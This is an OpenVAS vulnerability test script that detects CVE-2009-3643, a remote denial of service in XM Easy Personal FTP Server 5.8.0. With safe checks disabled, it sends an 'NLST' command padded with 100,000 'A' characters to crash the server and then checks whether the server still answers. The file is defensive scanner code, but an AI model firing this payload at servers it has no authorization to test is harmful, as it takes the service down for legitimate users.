###############################################################################
# OpenVAS Vulnerability Test
# $Id: xm_easy_ftp_37008.nasl 13488 2019-02-06 09:04:46Z asteins $
#
# XM Easy Personal FTP Server 'NLST' Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100342");
  script_version("$Revision: 13488 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 10:04:46 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-11-13 12:21:24 +0100 (Fri, 13 Nov 2009)");
  script_bugtraq_id(37008, 36969);
  script_cve_id("CVE-2009-3643");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("XM Easy Personal FTP Server 'NLST' Command Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37008");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36969");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/507785");
  script_xref(name:"URL", value:"http://www.dxm2008.com/");

  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/xm_easy_personal/detected");

  script_tag(name:"summary", value:"XM Easy Personal FTP Server is prone to a remote denial-of-service
  vulnerability.");

  script_tag(name:"impact", value:"This issue allows remote attackers to crash affected FTP servers,
  denying service to legitimate users.");

  script_tag(name:"affected", value:"XM Easy Personal FTP Server 5.8.0 is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("version_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(! banner || ! egrep(pattern: "Welcome to DXM's FTP Server", string:banner))
  exit(0);

if(safe_checks()) {
  version = eregmatch(pattern: "Welcome to DXM's FTP Server ([0-9.]+)", string: banner);
  if( version[1] && version_is_equal(version: version[1], test_version: "5.8.0")) {
    security_message(port:ftpPort);
    exit(0);
  }
} else {

  soc1 = open_sock_tcp(ftpPort);
  if(!soc1)
    exit(0);

  kb_creds = ftp_get_kb_creds();
  user = kb_creds["login"];
  pass = kb_creds["pass"];

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details)
  {
    ftpPort2 = ftp_get_pasv_port(socket:soc1);
    if(ftpPort2)
    {
      soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
      if(soc2)
      {
        bo_data = string("NLST ", crap(length: 100000, data:"A"));
        send(socket:soc1, data:bo_data);
        close(soc2);
        close(soc1);

        sleep(2);

        soc3 = open_sock_tcp(ftpPort);

        if( ! ftp_recv_line(socket:soc3) )
        {
          security_message(port:ftpPort);
    	  close(soc3);
          exit(0);
        }
      }
    }
  }
}

exit(0);
